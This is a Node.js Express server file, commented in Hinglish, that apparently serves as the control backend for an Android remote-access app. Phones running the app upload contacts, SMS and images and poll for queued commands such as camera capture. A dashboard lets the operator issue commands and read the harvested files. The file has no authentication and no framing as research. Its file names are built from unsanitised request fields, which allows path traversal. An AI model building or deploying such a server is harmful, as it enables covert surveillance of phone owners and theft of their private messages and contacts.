const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 📂 SETTING: Data kahan save hoga? ---
// Maine isko 'uploads' kar diya hai taaki tumhe aasani se mile
const UPLOADS_FOLDER = path.join(__dirname, 'uploads');

// Agar 'uploads' folder nahi hai, to khud bana lo
if (!fs.existsSync(UPLOADS_FOLDER)) {
    fs.mkdirSync(UPLOADS_FOLDER, { recursive: true });
    console.log("✅ 'uploads' folder successfully created!");
}

app.use(cors());
// Photo/Video ke liye limit badha di hai (50MB)
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let deviceState = {}; 

// ==========================================
// 🛠️ DEBUG TOOLS (Problem check karne ke liye)
// ==========================================

// Link: /api/debug/check-files
app.get('/api/debug/check-files', (req, res) => {
    fs.readdir(UPLOADS_FOLDER, (err, files) => {
        if (err) {
            return res.json({ error: "Cannot read folder", details: err.message });
        }
        // Files ki list aur size dikhao
        const fileDetails = files.map(file => {
            const stats = fs.statSync(path.join(UPLOADS_FOLDER, file));
            return { name: file, size: (stats.size / 1024).toFixed(2) + " KB" };
        });
        res.json({
            folder: "uploads",
            total_files: files.length,
            files: fileDetails
        });
    });
});

// ==========================================
// 📱 DASHBOARD API (Website ke liye)
// ==========================================

// 1. Check Device Online/Offline
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    // Agar 60 second se jyada ho gaye to Offline maano
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 60000 : false; 
    res.json({ ...state, isOnline });
});

// 2. Send Command (Jaise: contacts, camera, vibrate)
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Command Sent: '${command}' to Device: ${device_id}`);
    res.json({ status: "success", message: "Command queued" });
});

// 3. Get Data (Jo phone ne upload kiya hai use website par dikhao)
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const cleanType = req.params.type.toLowerCase(); // contacts, sms, etc.
    const deviceId = req.params.deviceId;
    
    // File ka naam wahi hoga jo phone bhejega
    // Example: M2103K19I_contacts.json
    const fileName = `${deviceId}_${cleanType}.json`;
    const filePath = path.join(UPLOADS_FOLDER, fileName);

    console.log(`🔍 Dashboard looking for: ${fileName}`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        console.log(`⚠️ File Not Found: ${fileName}`);
        res.json([]); // Agar file nahi hai to khaali list bhejo
    }
});


// ==========================================
// 📲 PHONE API (Android App ke liye)
// ==========================================

// 1. Phone Data Upload karega (Contacts, SMS, Images)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body;

    if (!device_id || !type || !data) {
        return res.status(400).send("Bad Request: Data missing");
    }

    console.log(`📥 Receiving Data from ${device_id}: ${type}`);

    // File save karne ka logic
    const cleanType = type.toLowerCase();
    const fileName = `${device_id}_${cleanType}.json`;
    const filePath = path.join(UPLOADS_FOLDER, fileName);
    
    try {
        let finalData = data;
        // Agar data string hai to JSON format mein sahi karo
        if (typeof data === 'string') {
            try { finalData = JSON.parse(data); } catch(e) {}
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`✅ File Saved in 'uploads': ${fileName}`);
        
        res.send("Success");
    } catch (err) {
        console.error("❌ Save Error:", err);
        res.status(500).send("Error saving data");
    }
});

// 2. Phone Status Update karega (Battery, Online)
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (device_id) {
        deviceState[device_id] = {
            model: model || "Unknown Device",
            android_version: android_version || "--",
            battery: battery || 0,
            ringerMode: ringerMode || "normal",
            lastSeen: Date.now(),
            // Purana command mat udao, jab tak phone le na le
            currentCommand: deviceState[device_id]?.currentCommand || "none"
        };
    }
    res.send("Status Updated");
});

// 3. Phone Command Check karega
app.get('/api/get-command/:device_id', (req, res) => {
    const deviceId = req.params.device_id;
    const cmd = deviceState[deviceId]?.currentCommand || "none";
    
    if (cmd !== "none") {
        // Command bhej diya, ab clear kar do taaki baar baar na jaye
        deviceState[deviceId].currentCommand = "none";
        console.log(`📤 Phone picked up command: ${cmd}`);
    }
    
    res.send(cmd); 
});

// Start Server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=========================================`);
    console.log(`🚀 SERVER STARTED on Port ${PORT}`);
    console.log(`📂 Data Folder: ${UPLOADS_FOLDER}`);
    console.log(`=========================================`);
});
